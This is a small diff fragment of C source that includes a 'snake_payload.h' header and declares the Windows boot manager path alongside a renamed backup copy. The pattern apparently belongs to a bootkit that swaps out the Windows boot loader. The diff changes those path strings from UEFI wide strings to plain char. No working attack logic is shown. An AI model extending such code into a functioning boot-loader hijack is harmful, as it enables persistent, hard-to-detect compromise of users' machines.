@@ -5,8 +5,8 @@
 #include "bootlib.h"
 #include "snake_payload.h"
 
-CHAR16 *OriginalLoader = L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi";
-CHAR16 *BackupLoader   = L"\\EFI\\Microsoft\\Boot\\bootmgfw_ms.efi";
+char *OriginalLoader = "\\EFI\\Microsoft\\Boot\\bootmgfw.efi";
+char *BackupLoader   = "\\EFI\\Microsoft\\Boot\\bootmgfw_ms.efi";
 
 int main(int argc, char **argv) {
     BOOLEAN won = FALSE;
